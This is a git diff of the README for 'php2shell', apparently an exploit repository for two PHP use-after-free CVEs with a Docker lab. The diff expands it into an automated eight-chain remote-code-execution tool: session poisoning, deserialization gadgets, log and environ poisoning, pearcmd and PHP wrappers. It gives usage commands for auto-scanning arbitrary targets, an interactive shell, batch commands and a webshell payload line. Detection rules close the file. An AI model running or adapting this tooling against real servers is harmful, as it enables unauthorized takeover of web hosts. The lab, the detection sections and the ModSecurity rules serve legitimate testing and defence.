@@ -21,10 +21,12 @@ Proof-of-concept exploit and isolated lab environment for two critical heap use-
 
 - [Background](#background)
 - [Technical Analysis](#technical-analysis)
+- [8-Chain Architecture](#8-chain-architecture)
 - [Repository Structure](#repository-structure)
 - [Quick Start](#quick-start)
 - [Lab Environment](#lab-environment)
 - [Exploit Usage](#exploit-usage)
+- [Chain Details](#chain-details)
 - [UAF Crash Probe](#uaf-crash-probe)
 - [Testing Mitigations](#testing-mitigations)
 - [Detection & Indicators](#detection--indicators)
@@ -50,40 +52,70 @@ PHP's [`session.upload_progress`](https://www.php.net/manual/en/session.upload-p
 
 **Attack primitive:** An attacker sends a multipart POST containing a `PHP_SESSION_UPLOAD_PROGRESS` field. The field's value — which the attacker fully controls — is written into the session file at a predictable path (`/var/lib/php/sessions/sess_<PHPSESSID>`). The session ID is supplied via cookie, and with `session.use_strict_mode = 0` (default), PHP accepts arbitrary values.
 
-**Exploitation chain (session poisoning + LFI):**
-
-```
-┌──────────┐     POST multipart/form-data          ┌──────────┐
-│ Attacker │ ──────────────────────────────────────►│  PHP-FPM │
-│          │  Cookie: PHPSESSID=attacker_sid         │          │
-│          │  Field: PHP_SESSION_UPLOAD_PROGRESS=    │          │
-│          │    <?php system($_GET['c']); ?>          │          │
-└──────────┘                                        └────┬─────┘
-                                                         │
-                                           Writes to session file:
-                                           /var/lib/php/sessions/sess_attacker_sid
-                                                         │
-┌──────────┐     GET /vuln.php?file=                ┌────▼─────┐
-│ Attacker │ ──────────────────────────────────────►│  PHP-FPM │
-│          │  /var/lib/php/sessions/sess_attacker_sid│          │
-│          │  &c=id                                  │          │
-│          │◄────────────────────────────────────────│  → RCE   │
-│          │  uid=33(www-data) ...                   │          │
-└──────────┘                                        └──────────┘
-```
-
 ### CVE-2026-109619 — Multipart Parser UAF
 
 A second use-after-free exists in PHP's SAPI-level multipart parser, independent of the session upload progress feature. This bug triggers on any `multipart/form-data` POST and persists even when `session.upload_progress.enabled = Off`. The parser mishandles buffer ownership during part boundary processing, leading to a dangling pointer that can be leveraged for heap corruption.
 
-### Exploitation Requirements
+---
 
-| Requirement | Chain 1 (Session Poisoning) | Chain 2 (Raw UAF) |
-|---|---|---|
-| `upload_progress.enabled` | On (default) | Not required |
-| LFI vulnerability | Required | Not required |
-| `upload_progress.cleanup` | Off, or race condition | N/A |
-| Complexity | Low | High (heap grooming) |
+## 8-Chain Architecture
+
+The v4.0 exploit implements **8 independent RCE chains**, each exploiting different conditions. This multi-vector approach maximizes success rate across diverse target configurations.
+
+| Chain | Name | Requirements | LFI Needed | Reliability |
+|---|---|---|---|---|
+| **1** | Session Poisoning + LFI | `upload_progress=On` + LFI | Yes | High |
+| **2** | Deserialization Gadgets | `upload_progress=On` + framework gadget | No | Medium |
+| **3** | /proc/self/fd Race | LFI + Linux `/proc` | Yes | Low |
+| **4** | phpinfo() Temp File Leak | phpinfo page + LFI | Yes | Medium |
+| **5** | Log Poisoning | Readable log files + LFI | Yes | Medium |
+| **6** | PEARCMD.php | `pearcmd.php` + `register_argc_argv=On` + LFI | Yes | Medium |
+| **7** | /proc/self/environ | Linux `/proc` readable + LFI | Yes | Medium |
+| **8** | PHP Wrappers | `allow_url_include=On` + LFI | Yes | High |
+
+### Auto-Exploit Flow
+
+```
+┌─────────────┐
+│   1. Recon   │──► PHP version, OS, session config, phpinfo, allow_url_include
+└──────┬──────┘
+       ▼
+┌─────────────┐
+│ 2. Framework │──► Laravel, Symfony, WordPress, Monolog, Guzzle, CodeIgniter, Yii
+│   Detection  │
+└──────┬──────┘
+       ▼
+┌─────────────┐
+│ 3. Chain 2   │──► Deserialization (no LFI needed, tries all gadgets)
+│  Deser Try   │
+└──────┬──────┘
+       ▼
+┌─────────────┐
+│ 4. LFI Scan  │──► 3-phase: Crawl → Alive Check → LFI Test
+└──────┬──────┘
+       ▼
+┌─────────────┐    ┌─────────┐    ┌─────────┐    ┌─────────┐
+│ 5. Chain 1   │──►│ Chain 5  │──►│ Chain 7  │──►│ Chain 6  │
+│ Session+LFI  │   │Log Poison│   │ environ  │   │ PEARCMD  │
+└──────┬──────┘    └────┬────┘    └────┬────┘    └────┬────┘
+       ▼                ▼              ▼              ▼
+┌─────────────┐    ┌─────────┐    ┌─────────┐
+│ 6. Chain 8   │──►│ Chain 4  │──►│ Chain 3  │──► Done
+│  Wrappers    │   │phpinfo() │   │/proc/fd  │
+└─────────────┘    └─────────┘    └─────────┘
+```
+
+### Deserialization Gadgets
+
+Chain 2 uses the PHP session serializer pipe `|` delimiter to inject serialized objects. When the progress value contains `|<serialized_object>`, the session handler splits on `|` and deserializes the payload, triggering `__destruct` → RCE.
+
+| Gadget | Framework | Target Versions | Entry Point |
+|---|---|---|---|
+| **Laravel/RCE1** | Laravel | 5.4+ (PHP 7.x) | PendingBroadcast → Events\Dispatcher |
+| **Laravel/RCE2** | Laravel | 5.6-9.x (PHP 7.x) | PendingBroadcast → Bus\Dispatcher |
+| **Monolog/RCE** | Monolog | 1.18-2.x | BufferHandler → StreamHandler |
+| **Guzzle/RCE** | Guzzle | 6.0-6.3.2 | FnStream → _fn_close |
+| **Symfony/RCE** | Symfony | 3.x-5.x | Process → commandline |
 
 ---
 
@@ -105,7 +137,7 @@ php2shell/
 │   ├── view.php               # Intentional LFI vulnerability
 │   └── debug.php              # Session file inspector
 ├── exploit/
-│   ├── php2shell.py           # Main RCE exploit (session poisoning + LFI)
+│   ├── php2shell.py           # Main RCE exploit (8-chain, v4.0)
 │   ├── uaf_probe.py           # Multipart parser UAF crash probe
 │   └── requirements.txt       # Python dependencies
 └── scripts/
@@ -118,7 +150,7 @@ php2shell/
 
 ```bash
 # Clone the repository
-git clone https://github.com/YOUR_USERNAME/php2shell.git
+git clone https://github.com/wakemeiflose/php2shell.git
 cd php2shell
 
 # Start the vulnerable lab
@@ -128,9 +160,12 @@ docker compose up --build -d
 chmod +x scripts/verify.sh
 bash scripts/verify.sh
 
-# Run the exploit
-pip install -r exploit/requirements.txt   # or: apt install python3-requests
+# Run the exploit (all chains)
+pip install -r exploit/requirements.txt
 python3 exploit/php2shell.py -t http://localhost:8080 -c "id"
+
+# Force a specific chain
+python3 exploit/php2shell.py -t http://localhost:8080 --chain 1 -c "id"
 
 # Interactive shell
 python3 exploit/php2shell.py -t http://localhost:8080 --shell
@@ -165,7 +200,7 @@ session.use_only_cookies = 0            # Allow session ID from cookies
 
 | Endpoint | Purpose |
 |---|---|
-| `index.php` | Displays PHP version and session configuration |
+| `index.php` | Displays PHP version, session configuration, phpinfo |
 | `upload.php` | Accepts multipart file uploads (injection target) |
 | `view.php?file=` | Intentional LFI — includes any local file (trigger) |
 | `debug.php` | Lists session files and their contents for debugging |
@@ -174,49 +209,23 @@ session.use_only_cookies = 0            # Allow session ID from cookies
 
 ## Exploit Usage
 
-### php2shell.py — Session Poisoning RCE
-
-**v2.0** introduces fully automatic LFI discovery. The exploit crawls the target, tests parameters for file inclusion, finds upload endpoints, brute-forces session paths, and chains everything together — no manual endpoint specification needed.
-
-```
-usage: php2shell.py [-h] -t TARGET [-c CMD | --shell | --check | --scan]
-                    [--cmds CMD [CMD ...]] [--cmd-file FILE]
-                    [--inject-endpoint EP] [--lfi-endpoint EP]
-                    [--session-path PATH] [--race] [--threads N]
-                    [--attempts N] [--proxy URL] [--scan-threads N]
-                    [-o FILE] [--json] [-v] [-q]
-```
-
-#### Auto Mode (Default)
-
-The default mode when no `--lfi-endpoint` is specified. Runs the full 5-step chain:
-
-1. **Recon** — fingerprints PHP version, OS, session config
-2. **LFI Discovery** — crawls for parameterized URLs, tests 30+ LFI parameter names with path traversal / filter payloads
-3. **Upload Endpoint Discovery** — crawls forms and brute-forces common upload paths
-4. **Session Path Enumeration** — tries 15+ common paths (Linux + Windows)
-5. **Exploitation** — iterates all LFI × upload × session path combinations
+### Full Auto Mode (Default)
 
 ```bash
-# Auto scan + exploit (one command does everything)
+# Auto scan + exploit using all 8 chains
 python3 exploit/php2shell.py -t http://target -c "id"
-
-# Against the lab
-python3 exploit/php2shell.py -t http://localhost:8080 -c "cat /etc/passwd"
 ```
 
-#### LFI Scan Only
-
-Scan without exploitation — useful for reconnaissance:
+### Chain Selection
 
 ```bash
-python3 exploit/php2shell.py -t https://target.example.com --scan
-python3 exploit/php2shell.py -t https://target.example.com --scan --json
+# Force specific chain
+python3 exploit/php2shell.py -t http://target --chain 1 -c "id"   # Session Poisoning
+python3 exploit/php2shell.py -t http://target --chain 2 -c "id"   # Deserialization
+python3 exploit/php2shell.py -t http://target --chain 5 -c "id"   # Log Poisoning
 ```
 
-#### Interactive Shell
-
-Automatically discovers LFI and endpoints, then drops into a shell:
+### Interactive Shell
 
 ```bash
 python3 exploit/php2shell.py -t http://localhost:8080 --shell
@@ -228,69 +237,110 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 php2shell> uname -a
 Linux abc123 6.8.0 #1 SMP x86_64 GNU/Linux
-
-php2shell> cat /etc/hostname
-php2shell-lab
 ```
 
-#### Batch Execution
+### LFI Scan Only
 
 ```bash
-# Inline commands
-python3 exploit/php2shell.py -t http://localhost:8080 \
-  --cmds "id" "whoami" "uname -a" "cat /etc/os-release"
-
-# From file
-python3 exploit/php2shell.py -t http://localhost:8080 --cmd-file recon.txt
+python3 exploit/php2shell.py -t https://target.example.com --scan
+python3 exploit/php2shell.py -t https://target.example.com --scan --json
 ```
 
-#### Race Condition Mode
-
-When `session.upload_progress.cleanup = On` (default), PHP deletes progress data from the session file immediately after the upload completes. The `--race` flag fires concurrent injection and LFI requests to read the session file before cleanup:
-
-```bash
-python3 exploit/php2shell.py -t http://localhost:8080 \
-  --race --threads 20 --attempts 500 -c "id"
-```
-
-#### Reconnaissance Only
+### Recon Only
 
 ```bash
 python3 exploit/php2shell.py -t https://target.example.com --check
-python3 exploit/php2shell.py -t https://target.example.com --check --json
 ```
 
-#### Proxy Support (Burp Suite)
+### Race Condition Mode
+
+When `session.upload_progress.cleanup = On` (default), PHP deletes progress data immediately after upload:
 
 ```bash
-python3 exploit/php2shell.py -t http://localhost:8080 -c "id" \
-  --proxy http://127.0.0.1:8081
+python3 exploit/php2shell.py -t http://target --race --threads 20 --attempts 500 -c "id"
 ```
 
-#### Manual Mode (Skip Auto-Discovery)
-
-For targets where you already know the LFI and upload endpoints:
+### Batch Execution
 
 ```bash
-python3 exploit/php2shell.py -t https://target.example.com \
-  --inject-endpoint "/contact.php" \
-  --lfi-endpoint "/page.php?file=" \
-  --session-path "/tmp" \
+python3 exploit/php2shell.py -t http://target --cmds "id" "whoami" "uname -a"
+python3 exploit/php2shell.py -t http://target --cmd-file recon.txt
+```
+
+### Manual Mode (Skip Auto-Discovery)
+
+```bash
+python3 exploit/php2shell.py -t http://target \
+  --inject-endpoint "/upload.php" \
+  --lfi-endpoint "/view.php?file=" \
+  --session-path "/var/lib/php/sessions" \
   -c "id"
 ```
 
-### Auto-Discovery Details
+### Proxy Support (Burp Suite)
 
-The LFI scanner tests the following:
+```bash
+python3 exploit/php2shell.py -t http://target -c "id" --proxy http://127.0.0.1:8081
+```
 
-| Category | Examples |
-|---|---|
-| **Parameters** | `file`, `page`, `include`, `path`, `doc`, `template`, `lang`, `view`, `content`, `module`, `load`, `action`, `url`, `dir`, `folder`, `read`, `filename` (30+ total) |
-| **Traversal (Linux)** | `../../../etc/passwd`, `....//....//etc/passwd`, `..%2f` encoding, double encoding, `php://filter` |
-| **Traversal (Windows)** | `..\..\..\windows\win.ini`, `..%5c` encoding, `C:\xampp\tmp`, `C:\Windows\Temp` |
-| **Detection** | `root:x:0:0` (Linux), `; for 16-bit app support` (Windows), base64-decoded php://filter output |
-| **Session Paths** | `/var/lib/php/sessions`, `/tmp`, `/var/tmp`, `C:\Windows\Temp`, `C:\xampp\tmp` (15+ total) |
-| **Upload Endpoints** | Form crawling (`enctype="multipart/form-data"`), brute-force of 20+ common paths |
+---
+
+## Chain Details
+
+### Chain 1 — Session Poisoning + LFI
+
+The classic php2shell chain. Injects PHP code via `PHP_SESSION_UPLOAD_PROGRESS` into a session file, then includes it via a file inclusion vulnerability.
+
+```
+Attacker → POST multipart (PHP_SESSION_UPLOAD_PROGRESS = "<?php system();?>")
+         → Session file written: /var/lib/php/sessions/sess_<SID>
+         → GET /vuln.php?file=/var/lib/php/sessions/sess_<SID>
+         → PHP includes session file → code executes → RCE
+```
+
+**Requirements:** `upload_progress.enabled=On`, LFI vulnerability, known session path.
+
+### Chain 2 — Deserialization Gadgets
+
+Exploits PHP's session serializer pipe `|` delimiter. Injects a serialized gadget object as the upload progress value. When another page calls `session_start()`, PHP deserializes the object and triggers `__destruct()` → RCE.
+
+**No LFI needed.** Requires a framework with an exploitable gadget class (Laravel, Symfony, Monolog, Guzzle).
+
+### Chain 3 — /proc/self/fd Temp File Race
+
+Uploads a large file with embedded PHP payload and races to include the temp file via `/proc/self/fd/N` before PHP cleans up. File descriptors 3-29 are brute-forced.
+
+**Requirements:** LFI + Linux with readable `/proc`.
+
+### Chain 4 — phpinfo() Temp File Leak
+
+Uses the Insomnia Security technique: uploads a file to a phpinfo() page, parses the streaming response for the `tmp_name` value, and races to include the temp file via LFI before cleanup.
+
+**Requirements:** Accessible phpinfo() page + LFI.
+
+### Chain 5 — Log Poisoning
+
+Injects PHP code into the `User-Agent` header, which gets written to web server access/error logs. Then includes the log file via LFI to execute the payload.
+
+**Tested log paths:** Apache, nginx, httpd access/error logs, auth.log, mail, vsftpd, sshd, `/proc/self/fd/2,7`.
+
+### Chain 6 — PEARCMD.php
+
+Exploits `pearcmd.php` (present in official Docker PHP images) to write a webshell via `config-create` or `man_dir` methods. Then includes the webshell via LFI.
+
+**Requirements:** `register_argc_argv=On` + accessible pearcmd.php + LFI.
+
+### Chain 7 — /proc/self/environ
+
+Injects PHP code via `User-Agent` header and includes `/proc/self/environ` via LFI. The environ file contains `HTTP_USER_AGENT` with the payload.
+
+**Requirements:** Linux with `/proc/self/environ` readable via LFI.
+
+### Chain 8 — PHP Wrappers
+
+Uses `php://input` or `data://` wrappers for direct code execution through the LFI vulnerability. Sends the PHP payload in the POST body or as a base64-encoded data URI.
+
+**Requirements:** `allow_url_include=On` + LFI.
 
 ---
 
@@ -299,15 +349,8 @@ The LFI scanner tests the following:
 `uaf_probe.py` sends malformed multipart payloads to detect the CVE-2026-109619 parser vulnerability. It does not achieve code execution — it identifies vulnerable targets through crash behavior.
 
 ```bash
-# Probe all variants
 python3 exploit/uaf_probe.py -t http://localhost:8080/upload.php
-
-# Specific variants with repetition
-python3 exploit/uaf_probe.py -t http://localhost:8080/upload.php \
-  --variant nested longheader --repeat 5 -v
-
-# HTTPS target
-python3 exploit/uaf_probe.py -t https://target.example.com/index.php
+python3 exploit/uaf_probe.py -t http://target --variant nested longheader --repeat 5 -v
 ```
 
 ### Probe Variants
@@ -320,15 +363,6 @@ python3 exploit/uaf_probe.py -t https://target.example.com/index.php
 | `truncated` | Missing closing boundary — unexpected EOF during part read |
 | `interleaved` | Mixed boundaries from different containers — confuses state machine |
 
-### Interpreting Results
-
-| Verdict | Meaning |
-|---|---|
-| `CRASH_LIKELY` | Connection reset or broken pipe — PHP worker probably segfaulted |
-| `WORKER_DEAD` | HTTP 502/503 — nginx reports php-fpm worker died |
-| `HANG_OR_CRASH` | Timeout — worker may be stuck or dead |
-| `OK` | Normal response — this variant did not trigger a crash |
-
 ---
 
 ## Testing Mitigations
@@ -336,18 +370,8 @@ python3 exploit/uaf_probe.py -t https://target.example.com/index.php
 ### Disable upload_progress (partial mitigation)
 
 ```bash
-# Apply mitigation
 docker exec php2shell-lab sed -i \
   's/upload_progress.enabled = On/upload_progress.enabled = Off/' \
-  /etc/php/8.4/fpm/php.ini
-docker exec php2shell-lab killall -USR2 php-fpm8.4
-
-# Verify — should fail
-python3 exploit/php2shell.py -t http://localhost:8080 -c "id"
-
-# Revert
-docker exec php2shell-lab sed -i \
-  's/upload_progress.enabled = Off/upload_progress.enabled = On/' \
   /etc/php/8.4/fpm/php.ini
 docker exec php2shell-lab killall -USR2 php-fpm8.4
 ```
@@ -363,42 +387,36 @@ docker exec php2shell-lab sed -i \
 docker exec php2shell-lab killall -USR2 php-fpm8.4
 ```
 
-This prevents the attacker from controlling the session filename but does not eliminate the vulnerability.
-
 ---
 
 ## Detection & Indicators
 
 ### Process Monitoring
 
-Alert when PHP worker processes spawn unexpected children:
-
 ```bash
-# Parent processes: php-fpm, php-cgi, apache2, httpd
-# Suspicious children: sh, bash, dash, python, perl, curl, wget, nc, ncat
 auditctl -a always,exit -F arch=b64 -S execve -F ppid=$(pgrep -d, php-fpm) -k php2shell
 ```
 
 ### Log Indicators
 
-Session file poisoning leaves traces in:
-
-- **PHP-FPM access logs:** POST requests with `PHP_SESSION_UPLOAD_PROGRESS` in the body, especially to endpoints that don't normally handle uploads
-- **nginx access logs:** Sequential POST then GET to different endpoints with the same session cookie
-- **Session directory:** Files containing `<?php` tags in `/var/lib/php/sessions/` or the configured `session.save_path`
+- POST requests with `PHP_SESSION_UPLOAD_PROGRESS` in the body
+- Sequential POST then GET to different endpoints with the same session cookie
+- Session files containing `<?php` tags
+- Unusual User-Agent strings containing PHP code
+- Requests to pearcmd.php paths or /proc/ paths
 
 ```bash
-# Check for poisoned session files
 grep -rl '<?php' /var/lib/php/sessions/
 ```
 
-### WAF Rules
-
-Temporary mitigation via ModSecurity:
+### WAF Rules (ModSecurity)
 
 ```
 SecRule ARGS:PHP_SESSION_UPLOAD_PROGRESS "@contains <?php" \
-  "id:2026109618,phase:2,deny,status:403,msg:'php2shell attempt'"
+  "id:2026109618,phase:2,deny,status:403,msg:'php2shell session poison'"
+
+SecRule REQUEST_HEADERS:User-Agent "@contains <?php" \
+  "id:2026109619,phase:1,deny,status:403,msg:'php2shell log poison'"
 ```
 
 ---
@@ -408,8 +426,13 @@ SecRule ARGS:PHP_SESSION_UPLOAD_PROGRESS "@contains <?php" \
 - [Sansec — Critical PHP RCE: php2shell](https://sansec.io/research/php2shell)
 - [watchTowr — PHP RCE FAQ](https://watchtowr.com/intelligence/php-cve-2026-109618-faq/)
 - [Huntress — php2shell Analysis](https://www.huntress.com/blog/php2shell-leaked-critical-php-vulnerabilities)
-- [Lilting — Session Upload Progress UAF](https://lilting.ch/en/articles/php2shell-session-upload-progress-uaf)
-- [Aikido — Critical PHP Vulnerabilities](https://www.aikido.dev/blog/critical-vulnerabilities-in-php-php2shell)
-- [Phoenix Security — PHP Core RCE](https://phoenix.security/php-core-rce-cve-2026-109618-109619-critical-remote-code-execution/)
+- [Brandefense — php2shell Blog](https://brandefense.io/blog/php2shell-php-rce-cve-2026-109618-109619/)
+- [SocRadar — CVE-2026-109618 & 109619](https://socradar.io/blog/php2shell-cve-2026-109618-cve-2026-109619/)
+- [SecurityWeek — Mass Exploitation Looms](https://www.securityweek.com/php2shell-mass-exploitation-looms-for-leaked-critical-php-flaws/)
+- [ikow/php2shell-poc — Analysis & PoC](https://github.com/ikow/php2shell-poc)
+- [HackTricks — LFI2RCE via PHP_SESSION_UPLOAD_PROGRESS](https://hacktricks.wiki/en/pentesting-web/file-inclusion/via-php_session_upload_progress.html)
+- [PayloadsAllTheThings — LFI to RCE](https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/LFI-to-RCE/)
+- [PHPGGC — PHP Gadget Chains](https://github.com/ambionics/phpggc)
+- [Check Point — php2shell Analysis](https://blog.checkpoint.com/security/php2shell-what-we-know-about-the-leaked-critical-php-vulnerabilities-cve-2026-109618-cve-2026-109619)
+- [Ox Security — Two PHP RCE Vulnerabilities](https://www.ox.security/blog/cve-2026-109618-cve-2026-109619-two-vulnerabilities-allow-unauthenticated-rce-in-php/)
 - [PHP Manual — Session Upload Progress](https://www.php.net/manual/en/session.upload-progress.php)
-- [Wikipedia — PHP2Shell](https://en.wikipedia.org/wiki/PHP2Shell)
